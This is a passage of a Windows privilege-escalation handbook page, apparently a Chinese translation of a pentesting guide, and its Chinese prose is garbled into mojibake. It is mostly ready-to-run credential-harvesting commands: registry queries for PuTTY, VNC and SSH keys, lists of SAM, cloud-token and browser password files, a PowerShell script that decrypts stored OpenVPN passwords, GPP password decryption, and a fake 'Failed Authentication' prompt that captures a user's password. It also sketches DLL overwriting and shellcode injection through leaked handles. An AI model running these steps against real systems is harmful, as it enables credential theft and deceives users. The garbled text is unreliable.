# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
</code></pre>
<h3 id="scclient--sccm"><a class="header" href="#scclient--sccm">SCClient / SCCM</a></h3>
<p>æ£€æŸ¥ <code>C:\Windows\CCM\SCClient.exe</code> æ˜¯å¦å­˜åœ¨ã€‚<br />
å®‰è£…ç¨‹åºæ˜¯<strong>ä»¥SYSTEMæƒé™è¿è¡Œçš„</strong>ï¼Œè®¸å¤šç¨‹åºå®¹æ˜“å—åˆ°<strong>DLLä¾§è½½æ”»å‡»ï¼ˆä¿¡æ¯æ¥è‡ª</strong> <a href="https://github.com/enjoiz/Privesc"><strong>https://github.com/enjoiz/Privesc</strong></a><strong>ï¼‰ã€‚</strong></p>
<pre><code class="language-bash">$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
</code></pre>
<h2 id="æ–‡ä»¶å’Œæ³¨å†Œè¡¨å‡­æ®"><a class="header" href="#æ–‡ä»¶å’Œæ³¨å†Œè¡¨å‡­æ®">æ–‡ä»¶å’Œæ³¨å†Œè¡¨ï¼ˆå‡­æ®ï¼‰</a></h2>
<h3 id="putty-å‡­æ®"><a class="header" href="#putty-å‡­æ®">Putty å‡­æ®</a></h3>
<pre><code class="language-bash">reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
</code></pre>
<h3 id="putty-ssh-ä¸»æœºå¯†é’¥"><a class="header" href="#putty-ssh-ä¸»æœºå¯†é’¥">Putty SSH ä¸»æœºå¯†é’¥</a></h3>
<pre><code>reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
</code></pre>
<h3 id="ssh-å¯†é’¥åœ¨æ³¨å†Œè¡¨ä¸­"><a class="header" href="#ssh-å¯†é’¥åœ¨æ³¨å†Œè¡¨ä¸­">SSH å¯†é’¥åœ¨æ³¨å†Œè¡¨ä¸­</a></h3>
<p>SSH ç§é’¥å¯ä»¥å­˜å‚¨åœ¨æ³¨å†Œè¡¨é”® <code>HKCU\Software\OpenSSH\Agent\Keys</code> ä¸­ï¼Œå› æ­¤æ‚¨åº”è¯¥æ£€æŸ¥é‚£é‡Œæ˜¯å¦æœ‰ä»»ä½•æœ‰è¶£çš„å†…å®¹ï¼š</p>
<pre><code class="language-bash">reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
</code></pre>
<p>å¦‚æœæ‚¨åœ¨è¯¥è·¯å¾„ä¸­æ‰¾åˆ°ä»»ä½•æ¡ç›®ï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ä¸ªä¿å­˜çš„ SSH å¯†é’¥ã€‚å®ƒæ˜¯åŠ å¯†å­˜å‚¨çš„ï¼Œä½†å¯ä»¥ä½¿ç”¨ <a href="https://github.com/ropnop/windows_sshagent_extract">https://github.com/ropnop/windows_sshagent_extract</a> å®¹æ˜“åœ°è§£å¯†ã€‚<br />
æœ‰å…³æ­¤æŠ€æœ¯çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§ï¼š<a href="https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/">https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/</a></p>
<p>å¦‚æœ <code>ssh-agent</code> æœåŠ¡æœªè¿è¡Œï¼Œå¹¶ä¸”æ‚¨å¸Œæœ›å®ƒåœ¨å¯åŠ¨æ—¶è‡ªåŠ¨å¯åŠ¨ï¼Œè¯·è¿è¡Œï¼š</p>
<pre><code class="language-bash">Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
</code></pre>
<p>{% hint style="info" %}
çœ‹èµ·æ¥è¿™ä¸ªæŠ€æœ¯å·²ç»ä¸å†æœ‰æ•ˆã€‚æˆ‘å°è¯•åˆ›å»ºä¸€äº›sshå¯†é’¥ï¼Œä½¿ç”¨<code>ssh-add</code>æ·»åŠ å®ƒä»¬ï¼Œå¹¶é€šè¿‡sshç™»å½•åˆ°ä¸€å°æœºå™¨ã€‚æ³¨å†Œè¡¨HKCU\Software\OpenSSH\Agent\Keysä¸å­˜åœ¨ï¼Œprocmonåœ¨éå¯¹ç§°å¯†é’¥è®¤è¯æœŸé—´æ²¡æœ‰è¯†åˆ«åˆ°<code>dpapi.dll</code>çš„ä½¿ç”¨ã€‚
{% endhint %}</p>
<h3 id="æ— äººå€¼å®ˆæ–‡ä»¶"><a class="header" href="#æ— äººå€¼å®ˆæ–‡ä»¶">æ— äººå€¼å®ˆæ–‡ä»¶</a></h3>
<pre><code>C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul
</code></pre>
<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ <strong>metasploit</strong> æœç´¢è¿™äº›æ–‡ä»¶ï¼š <em>post/windows/gather/enum_unattend</em></p>
<p>ç¤ºä¾‹å†…å®¹ï¼š</p>
<pre><code class="language-xml">&lt;component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64"&gt;
&lt;AutoLogon&gt;
&lt;Password&gt;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==&lt;/Password&gt;
&lt;Enabled&gt;true&lt;/Enabled&gt;
&lt;Username&gt;Administrateur&lt;/Username&gt;
&lt;/AutoLogon&gt;

&lt;UserAccounts&gt;
&lt;LocalAccounts&gt;
&lt;LocalAccount wcm:action="add"&gt;
&lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt;
&lt;Group&gt;administrators;users&lt;/Group&gt;
&lt;Name&gt;Administrateur&lt;/Name&gt;
&lt;/LocalAccount&gt;
&lt;/LocalAccounts&gt;
&lt;/UserAccounts&gt;
</code></pre>
<h3 id="sam--system-å¤‡ä»½"><a class="header" href="#sam--system-å¤‡ä»½">SAM &amp; SYSTEM å¤‡ä»½</a></h3>
<pre><code class="language-bash"># Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
</code></pre>
<h3 id="äº‘å‡­è¯"><a class="header" href="#äº‘å‡­è¯">äº‘å‡­è¯</a></h3>
<pre><code class="language-bash">#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
</code></pre>
<h3 id="mcafee-sitelistxml"><a class="header" href="#mcafee-sitelistxml">McAfee SiteList.xml</a></h3>
<p>æœç´¢åä¸º <strong>SiteList.xml</strong> çš„æ–‡ä»¶</p>
<h3 id="cached-gpp-pasword"><a class="header" href="#cached-gpp-pasword">Cached GPP Pasword</a></h3>
<p>ä¹‹å‰æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œå…è®¸é€šè¿‡ç»„ç­–ç•¥é¦–é€‰é¡¹ï¼ˆGPPï¼‰åœ¨ä¸€ç»„æœºå™¨ä¸Šéƒ¨ç½²è‡ªå®šä¹‰æœ¬åœ°ç®¡ç†å‘˜å¸æˆ·ã€‚ç„¶è€Œï¼Œè¿™ç§æ–¹æ³•å­˜åœ¨é‡å¤§å®‰å…¨ç¼ºé™·ã€‚é¦–å…ˆï¼Œå­˜å‚¨åœ¨ SYSVOL ä¸­çš„ç»„ç­–ç•¥å¯¹è±¡ï¼ˆGPOï¼‰ä½œä¸º XML æ–‡ä»¶ï¼Œå¯ä»¥è¢«ä»»ä½•åŸŸç”¨æˆ·è®¿é—®ã€‚å…¶æ¬¡ï¼Œè¿™äº› GPP ä¸­çš„å¯†ç ä½¿ç”¨å…¬å¼€æ–‡æ¡£çš„é»˜è®¤å¯†é’¥ä»¥ AES256 åŠ å¯†ï¼Œä»»ä½•ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·éƒ½å¯ä»¥è§£å¯†ã€‚è¿™æ„æˆäº†ä¸¥é‡é£é™©ï¼Œå› ä¸ºè¿™å¯èƒ½å…è®¸ç”¨æˆ·è·å¾—æå‡çš„æƒé™ã€‚</p>
<p>ä¸ºäº†å‡è½»è¿™ä¸€é£é™©ï¼Œå¼€å‘äº†ä¸€ä¸ªåŠŸèƒ½ï¼Œç”¨äºæ‰«æåŒ…å«éç©º "cpassword" å­—æ®µçš„æœ¬åœ°ç¼“å­˜ GPP æ–‡ä»¶ã€‚æ‰¾åˆ°æ­¤ç±»æ–‡ä»¶åï¼Œè¯¥åŠŸèƒ½è§£å¯†å¯†ç å¹¶è¿”å›ä¸€ä¸ªè‡ªå®šä¹‰ PowerShell å¯¹è±¡ã€‚è¯¥å¯¹è±¡åŒ…å«æœ‰å…³ GPP å’Œæ–‡ä»¶ä½ç½®çš„è¯¦ç»†ä¿¡æ¯ï¼Œæœ‰åŠ©äºè¯†åˆ«å’Œä¿®å¤æ­¤å®‰å…¨æ¼æ´ã€‚</p>
<p>åœ¨ <code>C:\ProgramData\Microsoft\Group Policy\history</code> æˆ– <em><strong>C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history</strong>ï¼ˆåœ¨ W Vista ä¹‹å‰ï¼‰</em> ä¸­æœç´¢è¿™äº›æ–‡ä»¶ï¼š</p>
<ul>
<li>Groups.xml</li>
<li>Services.xml</li>
<li>Scheduledtasks.xml</li>
<li>DataSources.xml</li>
<li>Printers.xml</li>
<li>Drives.xml</li>
</ul>
<p><strong>è¦è§£å¯† cPasswordï¼š</strong></p>
<pre><code class="language-bash">#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
</code></pre>
<p>ä½¿ç”¨ crackmapexec è·å–å¯†ç ï¼š</p>
<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
</code></pre>
<h3 id="iis-web-config"><a class="header" href="#iis-web-config">IIS Web Config</a></h3>
<pre><code class="language-powershell">Get-Childitem â€“Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
</code></pre>
<pre><code class="language-powershell">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
</code></pre>
<pre><code class="language-powershell">Get-Childitem â€“Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem â€“Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
</code></pre>
<p>ç¤ºä¾‹ web.config æ–‡ä»¶ï¼ŒåŒ…å«å‡­æ®ï¼š</p>
<pre><code class="language-xml">&lt;authentication mode="Forms"&gt;
&lt;forms name="login" loginUrl="/admin"&gt;
&lt;credentials passwordFormat = "Clear"&gt;
&lt;user name="Administrator" password="SuperAdminPassword" /&gt;
&lt;/credentials&gt;
&lt;/forms&gt;
&lt;/authentication&gt;
</code></pre>
<h3 id="openvpn-å‡­æ®"><a class="header" href="#openvpn-å‡­æ®">OpenVPN å‡­æ®</a></h3>
<pre><code class="language-csharp">Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
</code></pre>
<h3 id="æ—¥å¿—"><a class="header" href="#æ—¥å¿—">æ—¥å¿—</a></h3>
<pre><code class="language-bash"># IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem â€“Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
</code></pre>
<h3 id="ask-for-credentials"><a class="header" href="#ask-for-credentials">Ask for credentials</a></h3>
<p>æ‚¨å¯ä»¥å§‹ç»ˆ<strong>è¦æ±‚ç”¨æˆ·è¾“å…¥ä»–çš„å‡­æ®æˆ–å…¶ä»–ç”¨æˆ·çš„å‡­æ®</strong>ï¼Œå¦‚æœæ‚¨è®¤ä¸ºä»–å¯èƒ½çŸ¥é“å®ƒä»¬ï¼ˆè¯·æ³¨æ„ï¼Œ<strong>ç›´æ¥å‘</strong>å®¢æˆ·ç«¯<strong>è¯¢é—®</strong> <strong>å‡­æ®</strong>æ˜¯éå¸¸<strong>å±é™©</strong>çš„ï¼‰ï¼š</p>
<pre><code class="language-bash">$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
</code></pre>
<h3 id="å¯èƒ½åŒ…å«å‡­æ®çš„æ–‡ä»¶å"><a class="header" href="#å¯èƒ½åŒ…å«å‡­æ®çš„æ–‡ä»¶å"><strong>å¯èƒ½åŒ…å«å‡­æ®çš„æ–‡ä»¶å</strong></a></h3>
<p>å·²çŸ¥ä¸€äº›æ–‡ä»¶æ›¾ç»åŒ…å«<strong>æ˜æ–‡</strong>æˆ–<strong>Base64</strong>æ ¼å¼çš„<strong>å¯†ç </strong></p>
<pre><code class="language-bash">$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
</code></pre>
<p>æœç´¢æ‰€æœ‰æè®®çš„æ–‡ä»¶ï¼š</p>
<pre><code>cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2&gt;nul | findstr /v ".dll"
</code></pre>
<pre><code>Get-Childitem â€“Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
</code></pre>
<h3 id="å›æ”¶ç«™ä¸­çš„å‡­æ®"><a class="header" href="#å›æ”¶ç«™ä¸­çš„å‡­æ®">å›æ”¶ç«™ä¸­çš„å‡­æ®</a></h3>
<p>æ‚¨è¿˜åº”è¯¥æ£€æŸ¥å›æ”¶ç«™ä»¥æŸ¥æ‰¾å…¶ä¸­çš„å‡­æ®</p>
<p>è¦<strong>æ¢å¤</strong>ç”±å¤šä¸ªç¨‹åºä¿å­˜çš„å¯†ç ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š<a href="http://www.nirsoft.net/password_recovery_tools.html">http://www.nirsoft.net/password_recovery_tools.html</a></p>
<h3 id="æ³¨å†Œè¡¨å†…éƒ¨"><a class="header" href="#æ³¨å†Œè¡¨å†…éƒ¨">æ³¨å†Œè¡¨å†…éƒ¨</a></h3>
<p><strong>å…¶ä»–å¯èƒ½åŒ…å«å‡­æ®çš„æ³¨å†Œè¡¨é¡¹</strong></p>
<pre><code class="language-bash">reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
</code></pre>
<p><a href="https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/"><strong>ä»æ³¨å†Œè¡¨ä¸­æå–opensshå¯†é’¥ã€‚</strong></a></p>
<h3 id="æµè§ˆå™¨å†å²"><a class="header" href="#æµè§ˆå™¨å†å²">æµè§ˆå™¨å†å²</a></h3>
<p>æ‚¨åº”è¯¥æ£€æŸ¥å­˜å‚¨<strong>Chromeæˆ–Firefox</strong>å¯†ç çš„æ•°æ®åº“ã€‚<br />
è¿˜è¦æ£€æŸ¥æµè§ˆå™¨çš„å†å²è®°å½•ã€ä¹¦ç­¾å’Œæ”¶è—å¤¹ï¼Œå¯èƒ½ä¼šå­˜å‚¨ä¸€äº›<strong>å¯†ç </strong>ã€‚</p>
<p>ä»æµè§ˆå™¨æå–å¯†ç çš„å·¥å…·ï¼š</p>
<ul>
<li>Mimikatz: <code>dpapi::chrome</code></li>
<li><a href="https://github.com/djhohnstein/SharpWeb"><strong>SharpWeb</strong></a></li>
<li><a href="https://github.com/djhohnstein/SharpChromium"><strong>SharpChromium</strong></a></li>
<li><a href="https://github.com/GhostPack/SharpDPAPI"><strong>SharpDPAPI</strong></a></li>
</ul>
<h3 id="com-dllè¦†ç›–"><a class="header" href="#com-dllè¦†ç›–"><strong>COM DLLè¦†ç›–</strong></a></h3>
<p><strong>ç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼ˆCOMï¼‰<strong>æ˜¯å†…ç½®äºWindowsæ“ä½œç³»ç»Ÿä¸­çš„ä¸€ç§æŠ€æœ¯ï¼Œå…è®¸ä¸åŒè¯­è¨€çš„è½¯ä»¶ç»„ä»¶ä¹‹é—´è¿›è¡Œ</strong>äº’é€š</strong>ã€‚æ¯ä¸ªCOMç»„ä»¶é€šè¿‡ç±»IDï¼ˆCLSIDï¼‰è¿›è¡Œ<strong>æ ‡è¯†</strong>ï¼Œæ¯ä¸ªç»„ä»¶é€šè¿‡ä¸€ä¸ªæˆ–å¤šä¸ªæ¥å£æš´éœ²åŠŸèƒ½ï¼Œè¿™äº›æ¥å£é€šè¿‡æ¥å£IDï¼ˆIIDsï¼‰è¿›è¡Œæ ‡è¯†ã€‚</p>
<p>COMç±»å’Œæ¥å£åœ¨æ³¨å†Œè¡¨ä¸­å®šä¹‰ï¼Œåˆ†åˆ«ä½äº<strong>HKEY_</strong><em><strong>CLASSES_</strong></em><strong>ROOT\CLSID</strong>å’Œ<strong>HKEY_</strong><em><strong>CLASSES_</strong></em><strong>ROOT\Interface</strong>ã€‚è¯¥æ³¨å†Œè¡¨æ˜¯é€šè¿‡åˆå¹¶<strong>HKEY_</strong><em><strong>LOCAL_</strong></em><strong>MACHINE\Software\Classes</strong> + <strong>HKEY_</strong><em><strong>CURRENT_</strong></em><strong>USER\Software\Classes</strong> = <strong>HKEY_</strong><em><strong>CLASSES_</strong></em><strong>ROOT</strong>åˆ›å»ºçš„ã€‚</p>
<p>åœ¨è¯¥æ³¨å†Œè¡¨çš„CLSIDä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°å­æ³¨å†Œè¡¨<strong>InProcServer32</strong>ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæŒ‡å‘<strong>DLL</strong>çš„<strong>é»˜è®¤å€¼</strong>å’Œä¸€ä¸ªåä¸º<strong>ThreadingModel</strong>çš„å€¼ï¼Œè¯¥å€¼å¯ä»¥æ˜¯<strong>Apartment</strong>ï¼ˆå•çº¿ç¨‹ï¼‰ã€<strong>Free</strong>ï¼ˆå¤šçº¿ç¨‹ï¼‰ã€<strong>Both</strong>ï¼ˆå•çº¿ç¨‹æˆ–å¤šçº¿ç¨‹ï¼‰æˆ–<strong>Neutral</strong>ï¼ˆçº¿ç¨‹ä¸­ç«‹ï¼‰ã€‚</p>
<p><img src="../../.gitbook/assets/image%20(729).png" alt="" /></p>
<p>åŸºæœ¬ä¸Šï¼Œå¦‚æœæ‚¨å¯ä»¥<strong>è¦†ç›–ä»»ä½•å°†è¦æ‰§è¡Œçš„DLL</strong>ï¼Œå¦‚æœè¯¥DLLå°†ç”±ä¸åŒç”¨æˆ·æ‰§è¡Œï¼Œæ‚¨å°±å¯ä»¥<strong>æå‡æƒé™</strong>ã€‚</p>
<p>è¦äº†è§£æ”»å‡»è€…å¦‚ä½•ä½¿ç”¨COMåŠ«æŒä½œä¸ºæŒä¹…æ€§æœºåˆ¶ï¼Œè¯·æŸ¥çœ‹ï¼š</p>
<p>{% content-ref url="com-hijacking.md" %}
<a href="com-hijacking.html">com-hijacking.md</a>
{% endcontent-ref %}</p>
<h3 id="åœ¨æ–‡ä»¶å’Œæ³¨å†Œè¡¨ä¸­æœç´¢é€šç”¨å¯†ç "><a class="header" href="#åœ¨æ–‡ä»¶å’Œæ³¨å†Œè¡¨ä¸­æœç´¢é€šç”¨å¯†ç "><strong>åœ¨æ–‡ä»¶å’Œæ³¨å†Œè¡¨ä¸­æœç´¢é€šç”¨å¯†ç </strong></a></h3>
<p><strong>æœç´¢æ–‡ä»¶å†…å®¹</strong></p>
<pre><code class="language-bash">cd C:\ &amp; findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
</code></pre>
<p><strong>æœç´¢å…·æœ‰ç‰¹å®šæ–‡ä»¶åçš„æ–‡ä»¶</strong></p>
<pre><code class="language-bash">dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
</code></pre>
<p><strong>æœç´¢æ³¨å†Œè¡¨ä¸­çš„é”®åå’Œå¯†ç </strong></p>
<pre><code class="language-bash">REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
</code></pre>
<h3 id="æœç´¢å¯†ç çš„å·¥å…·"><a class="header" href="#æœç´¢å¯†ç çš„å·¥å…·">æœç´¢å¯†ç çš„å·¥å…·</a></h3>
<p><a href="https://github.com/carlospolop/MSF-Credentials"><strong>MSF-Credentials Plugin</strong></a> <strong>æ˜¯ä¸€ä¸ªmsf</strong> æ’ä»¶ï¼Œæˆ‘åˆ›å»ºè¿™ä¸ªæ’ä»¶æ˜¯ä¸ºäº† <strong>è‡ªåŠ¨æ‰§è¡Œæ¯ä¸ªæœç´¢å‡­æ®çš„metasploit POSTæ¨¡å—</strong> åœ¨å—å®³è€…å†…éƒ¨ã€‚<br />
<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"><strong>Winpeas</strong></a> è‡ªåŠ¨æœç´¢æ­¤é¡µé¢ä¸­æåˆ°çš„æ‰€æœ‰åŒ…å«å¯†ç çš„æ–‡ä»¶ã€‚<br />
<a href="https://github.com/AlessandroZ/LaZagne"><strong>Lazagne</strong></a> æ˜¯å¦ä¸€ä¸ªä»ç³»ç»Ÿä¸­æå–å¯†ç çš„ä¼˜ç§€å·¥å…·ã€‚</p>
<p>å·¥å…· <a href="https://github.com/Arvanaghi/SessionGopher"><strong>SessionGopher</strong></a> æœç´¢ <strong>ä¼šè¯</strong>ã€<strong>ç”¨æˆ·å</strong> å’Œ <strong>å¯†ç </strong>ï¼Œè¿™äº›æ•°æ®ä»¥æ˜æ–‡å½¢å¼ä¿å­˜åœ¨å¤šä¸ªå·¥å…·ä¸­ï¼ˆPuTTYã€WinSCPã€FileZillaã€SuperPuTTY å’Œ RDPï¼‰ã€‚</p>
<pre><code class="language-bash">Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
</code></pre>
<h2 id="æ³„éœ²çš„å¥æŸ„"><a class="header" href="#æ³„éœ²çš„å¥æŸ„">æ³„éœ²çš„å¥æŸ„</a></h2>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œ<strong>ä¸€ä¸ªä»¥SYSTEMèº«ä»½è¿è¡Œçš„è¿›ç¨‹æ‰“å¼€ä¸€ä¸ªæ–°è¿›ç¨‹</strong>ï¼ˆ<code>OpenProcess()</code>ï¼‰å¹¶å…·æœ‰<strong>å®Œå…¨è®¿é—®æƒé™</strong>ã€‚åŒä¸€ä¸ªè¿›ç¨‹<strong>è¿˜åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹</strong>ï¼ˆ<code>CreateProcess()</code>ï¼‰ï¼Œ<strong>å…·æœ‰ä½æƒé™ä½†ç»§æ‰¿ä¸»è¿›ç¨‹çš„æ‰€æœ‰æ‰“å¼€å¥æŸ„</strong>ã€‚<br />
ç„¶åï¼Œå¦‚æœä½ å¯¹<strong>ä½æƒé™è¿›ç¨‹å…·æœ‰å®Œå…¨è®¿é—®æƒé™</strong>ï¼Œä½ å¯ä»¥æŠ“å–<strong>é€šè¿‡<code>OpenProcess()</code>åˆ›å»ºçš„ç‰¹æƒè¿›ç¨‹çš„æ‰“å¼€å¥æŸ„</strong>å¹¶<strong>æ³¨å…¥shellcode</strong>ã€‚<br />
<a href="leaked-handle-exploitation.html">é˜…è¯»è¿™ä¸ªä¾‹å­ä»¥è·å–æœ‰å…³<strong>å¦‚ä½•æ£€æµ‹å’Œåˆ©ç”¨æ­¤æ¼æ´</strong>çš„æ›´å¤šä¿¡æ¯ã€‚</a><br />
<a href="http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/">é˜…è¯»è¿™ç¯‡<strong>å…¶ä»–æ–‡ç« ä»¥è·å–æ›´å®Œæ•´çš„è§£é‡Šï¼Œäº†è§£å¦‚ä½•æµ‹è¯•å’Œæ»¥ç”¨å…·æœ‰ä¸åŒæƒé™çº§åˆ«ï¼ˆä¸ä»…ä»…æ˜¯å®Œå…¨è®¿é—®æƒé™ï¼‰ç»§æ‰¿çš„è¿›ç¨‹å’Œçº¿ç¨‹çš„æ›´å¤šæ‰“å¼€å¥æŸ„</strong></a>.</p>
<h2 id="å‘½åç®¡é“å®¢æˆ·ç«¯-impersonation"><a class="header" href="#å‘½åç®¡é“å®¢æˆ·ç«¯-impersonation">å‘½åç®¡é“å®¢æˆ·ç«¯ impersonation</a></h2>
<p>å…±äº«å†…å­˜æ®µï¼Œç§°ä¸º<strong>ç®¡é“</strong>ï¼Œä½¿è¿›ç¨‹ä¹‹é—´èƒ½å¤Ÿè¿›è¡Œé€šä¿¡å’Œæ•°æ®ä¼ è¾“ã€‚</p>
